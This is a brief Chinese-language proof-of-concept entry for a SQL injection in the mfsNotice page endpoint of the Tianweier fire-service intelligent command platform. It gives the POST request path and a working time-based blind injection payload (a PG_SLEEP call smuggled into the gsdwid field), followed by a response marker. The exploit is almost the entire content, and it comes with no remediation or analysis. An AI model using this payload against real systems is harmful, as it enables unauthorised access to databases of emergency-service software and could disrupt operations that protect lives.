# 天维尔消防智能指挥平台mfsNoticeSQL注入漏洞

天维尔消防智能指挥平台mfsNotice ｜ SQL注入 ｜ —
- **请求**：`POST /twms-service-mfs/mfsNotice/page HTTP/1.1`

**Payload**
```
{"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930')AND 5803=(SELECT 5803 FROM PG_SLEEP(5)) AND ('dudesuite'='dudesuite"},"hgubmt748n4":"="}
```
- **响应特征**：999